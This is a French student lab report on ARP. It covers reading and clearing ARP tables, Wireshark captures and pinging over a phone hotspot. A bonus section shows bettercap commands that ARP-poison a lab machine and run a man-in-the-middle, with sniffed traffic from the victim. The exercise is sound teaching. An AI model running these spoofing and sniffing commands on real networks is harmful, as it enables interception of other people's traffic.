# TP3 : 32°13'34"N 95°03'27"W


## Sommaire

- [TP3 : 32°13'34"N 95°03'27"W](#tp3--321334n-950327w)
  - [Sommaire](#sommaire)
- [0. Prérequis](#0-prérequis)
- [I. ARP basics](#i-arp-basics)
- [II. ARP dans un réseau local](#ii-arp-dans-un-réseau-local)
  - [1. Basics](#1-basics)
  - [2. ARP](#2-arp)
  - [3. Bonus : ARP poisoning](#3-bonus--arp-poisoning)



# I. ARP basics


☀️ **Avant de continuer...**

- affichez l'adresse MAC de votre carte WiFi !

```zsh
Wireless LAN adapter Wi-Fi:

  Physical Address. . . . . . . . . : 28-C5-D2-EA-30-53
```

☀️ **Affichez votre table ARP**

- allez vous commencez à devenir grands, je vous donne pas la commande, demande à m'sieur internet !

```zsh
 PS C:\Users\NICOLAS> arp -a

 Interface: 10.33.76.110 --- 0x8
  Internet Address      Physical Address      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamic
  10.33.73.77           98-8d-46-c4-fa-e5     dynamic
  10.33.77.159          f8-54-f6-ba-c5-1a     dynamic
  10.33.77.160          c8-94-02-f8-ab-97     dynamic
  10.33.79.254          7c-5a-1c-d3-d8-76     dynamic
  10.33.79.255          ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 169.254.141.7 --- 0x10
  Internet Address      Physical Address      Type
  169.254.255.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

☀️ **Déterminez l'adresse MAC de la passerelle du réseau de l'école**

- la passerelle, vous connaissez son adresse IP normalement (cf TP1 ;) )
- si vous avez un accès internet, votre PC a forcément l'adresse MAC de la passerelle dans sa table ARP

```zsh
 10.33.79.254          7c-5a-1c-d3-d8-76     dynamic
```

☀️ **Supprimez la ligne qui concerne la passerelle**

- une commande pour supprimer l'adresse MAC de votre table ARP
- si vous ré-affichez votre table ARP, y'a des chances que ça revienne presque tout de suite !

```zsh
PS C:\Windows\system32> arp -d 10.33.79.254 ; arp -a
```

☀️ **Prouvez que vous avez supprimé la ligne dans la table ARP**

- en affichant la table ARP
- si la ligne est déjà revenue, déconnecte-toi temporairement du réseau de l'école, et supprime-la de nouveau

```zsh
PS C:\Windows\system32> arp -d 10.33.79.254 ; arp -a

Interface: 10.33.76.110 --- 0x8
  Internet Address      Physical Address      Type
  10.33.65.63           44-af-28-c3-6a-9f     dynamic
  10.33.73.77           98-8d-46-c4-fa-e5     dynamic
  10.33.77.159          f8-54-f6-ba-c5-1a     dynamic
  10.33.77.160          c8-94-02-f8-ab-97     dynamic
  10.33.79.255          ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 169.254.141.7 --- 0x10
  Internet Address      Physical Address      Type
  169.254.255.255       ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
```

☀️ **Wireshark**

- capture `arp1.pcap`
- lancez une capture Wireshark, puis supprimez la ligne de la passerelle dans la table ARP pendant que la capture est en cours
- la capture doit contenir uniquement 2 trames :
  - un ARP request que votre PC envoie pour apprendre l'adresse MAC de la passerelle
  - et la réponse

[lien vers ma capture](arp1.pcap)

# II. ARP dans un réseau local


Dans cette situation, le téléphone agit comme une "box" :

- **c'est un switch**
  - il permet à tout le monde d'être connecté à un même réseau local
- **c'est aussi un routeur**
  - il fait passer les paquets du réseau local, à internet
  - et vice-versa
  - on dit que ce routeur est la **passerelle** du réseau local

## 1. Basics


☀️ **Déterminer**

- pour la carte réseau impliquée dans le partage de connexion (carte WiFi ?)
- son adresse IP au sein du réseau local formé par le partage de co
- son adresse MAC

```zsh
PS C:\Windows\system32> arp -a

   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.231.2
   DNS Servers . . . . . . . . . . . : 192.168.231.2
   NetBIOS over Tcpip. . . . . . . . : Enabled


PS C:\Windows\system32> ipconfig /all

   192.168.231.2         e6-0f-c1-06-f5-1d     dynamic

☀️ **DIY**

- changer d'adresse IP
  - vous pouvez le faire en interface graphique
- faut procéder comme au TP1 :
  - vous respectez les informations que vous connaissez du réseau
  - remettez la même passerelle, le même masque, et le même serveur DNS
  - changez seulement votre adresse IP, ne changez que le dernier nombre
- prouvez que vous avez bien changé d'IP
  - avec une commande !

```zsh
ancienne
PS C:\Windows\system32> ipconfig

   IPv4 Address. . . . . . . . . . . : 192.168.231.44


nouvelle
PS C:\Windows\system32> ipconfig

   IPv4 Address. . . . . . . . . . . : 192.168.231.56
```

☀️ **Pingz !**

- vérifiez que vous pouvez tous vous `ping` avec ces adresses IP
- vérifiez avec une commande `ping` que vous avez bien un accès internet

```zsh
PS C:\Windows\system32> ping 192.168.231.25

Ping statistics for 192.168.231.25:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 8ms, Maximum = 1821ms, Average = 461ms


PS C:\Windows\system32> ping 192.168.231.7

Ping statistics for 192.168.231.7:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 8ms, Maximum = 64ms, Average = 32ms
```

## 2. ARP

☀️ **Affichez votre table ARP !**

- normalement, après les `ping`, vous avez appris l'adresse MAC de tous les autres

```zsh
PS C:\Windows\system32> arp -a

Interface: 192.168.231.56 --- 0x8
  Internet Address      Physical Address      Type
  192.168.231.2         e6-0f-c1-06-f5-1d     dynamic
  192.168.231.7         58-cd-c9-22-43-fd     dynamic
  192.168.231.25        f8-54-f6-ba-c5-1a     dynamic
```


➜ **Wireshark that**

- lancez tous Wireshark
- videz tous vos tables ARP
- normalement, y'a ~~presque~~ pas de raisons que vos PCs se contactent entre eux spontanément donc les tables ARP devraient rester vides tant que vous faites rien
- à tour de rôle, envoyez quelques `ping` entre vous
- constatez les messages ARP spontanés qui précèdent vos `ping`
  - ARP request
    - envoyé en broadcast `ff:ff:ff:ff:ff:ff`
    - tout le monde les reçoit donc !
  - ARP reply
    - celui qui a été `ping` répond à celui qui a initié le `pingv
    - il l'informe que l'adresse IP qui a été `ping` correspond à son adresse MAC

☀️ **Capture arp2.pcap**

- ne contient que des ARP request et ARP reply
- contient tout le nécessaire pour que votre table ARP soit populée avec l'adresse MAC de tout le monde

[lien vers ma capture](arp2.pcap)

## 3. Bonus : ARP poisoning

⭐ **Empoisonner la table ARP de l'un des membres de votre réseau**

- il faut donc forcer l'injection de fausses informations dans la table ARP de quelqu'un d'autre
- on peut le faire en envoyant des messages ARP que l'on a forgé nous-mêmes
- avec quelques lignes de code, ou y'a déjà ce qu'il faut sur internet
- faites vos recherches, demandez-moi si vous voulez de l'aide
- affichez la table ARP de la victime une fois modifiée dans le compte-rendu

```zsh
┌──(oui㉿oui)-[~]
└─$ sudo bettercap
bettercap v2.33.0 (built for linux amd64 with go1.22.6) [type 'help' for a list of commands]

10.1.1.0/24 > 10.1.1.100  » [18:41:18] [sys.log] [inf] gateway monitor started ...
10.1.1.0/24 > 10.1.1.100  » net.sniff on
[18:41:21] [sys.log] [inf] net.sniff starting net.recon as a requirement for net.sniff
10.1.1.0/24 > 10.1.1.100  » [18:41:21] [endpoint.new] endpoint fe80::800:27ff:fe00:1 detected as 0a:00:27:00:00:01.
10.1.1.0/24 > 10.1.1.100  » [18:41:21] [endpoint.new] endpoint 10.1.1.102 detected as 08:00:27:2e:a5:3f (PCS Systemtechnik GmbH).
10.1.1.0/24 > 10.1.1.100  » set arp.spoof.targets 10.1.1.102
10.1.1.0/24 > 10.1.1.100  » net.probe on
10.1.1.0/24 > 10.1.1.100  » [18:41:34] [sys.log] [inf] net.probe probing 256 addresses on 10.1.1.0/24
10.1.1.0/24 > 10.1.1.100  » arp.spoof on
10.1.1.0/24 > 10.1.1.100  » [18:41:52] [sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets.
```

POV victime :
```zsh
┌──(oui㉿oui)-[~]
└─$ arp  
Address                  HWtype  HWaddress           Flags Mask            Iface
10.1.1.100               ether   08:00:27:51:12:58   C                     eth0
10.1.1.100               ether   08:00:27:51:12:58   C                     eth0
```


⭐ **Mettre en place un MITM**

- MITM pour Man-in-the-middle
- placez vous entre l'un des membres du réseau, et la passerelle
- ainsi, dès que ce PC va sur internet, c'est à vous qu'il envoie tous ses messages
- pour ça, il faut continuellement empoisonner la table ARP de la victime, et celle de la passerelle

```zsh
10.1.1.0/24 > 10.1.1.100  » [18:51:25] [net.sniff.https] sni 10.1.1.102 > https://lh5.googleusercontent.com
10.1.1.0/24 > 10.1.1.100  » [18:51:25] [net.sniff.https] sni 10.1.1.102 > https://lh5.googleusercontent.com
10.1.1.0/24 > 10.1.1.100  » [18:51:25] [net.sniff.http.request] http 10.1.1.102 POST o.pki.goog/wr2

POST /wr2 HTTP/1.1
Host: o.pki.goog
Accept-Language: en-US,en;q=0.5
Content-Type: application/ocsp-request
Content-Length: 83
Pragma: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cache-Control: no-cache

00000000  30 51 30 4f 30 4d 30 4b  30 49 30 09 06 05 2b 0e  |0Q0O0M0K0I0...+.|
00000010  03 02 1a 05 00 04 14 53  42 d4 84 8b c1 17 f9 b6  |.......SB.......|
00000020  14 4d 77 7c fb 23 31 0f  7b 35 cd 04 14 de 1b 1e  |.Mw|.#1.{5......|
00000030  ed 79 15 d4 3e 37 24 c3  21 bb ec 34 39 6d 42 b2  |.y..>7$.!..49mB.|
00000040  30 02 10 7e 53 2a 09 45  41 89 aa 10 46 2f b5 d4  |0..~S*.EA...F/..|
00000050  e1 10 b0                                          |...|
```